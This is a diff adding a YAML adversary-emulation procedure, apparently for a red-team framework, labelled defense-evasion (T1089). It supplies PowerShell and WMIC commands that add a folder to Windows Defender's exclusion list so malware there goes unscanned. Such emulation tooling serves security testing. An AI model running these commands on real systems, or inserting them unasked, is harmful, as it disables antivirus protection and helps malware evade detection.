@@ -1,0 +1,22 @@
+id: b8242780-1177-4dbf-a3d3-4c8d7c13d3c1
+name: Add Windows Defender folder based exclusion
+description: |
+  Windows Defender allows Administrators to create exclusion lists that can be abused to make malware and Unwanted software run undetected.
+  This procedure Adds the given folder to this list, causing the subfolders and files in the directory not to be inspected by Windows Defender AV.
+metadata:
+  version: 1
+  authors:
+    - w0rk3r
+  tags: []
+tactic: defense-evasion
+technique:
+  id: T1089
+  name: "Disabling Security Tools"
+platforms:
+  windows:
+    psh:
+      command: |
+        Add-MpPreference -ExclusionPath "#{directory.exclusion}"
+    cmd:
+      command: |
+        wmic /Namespace:"\\root\Microsoft\Windows\Defender" class MSFT_MpPreference call Add ExclusionPath="#{directory.exclusion}"
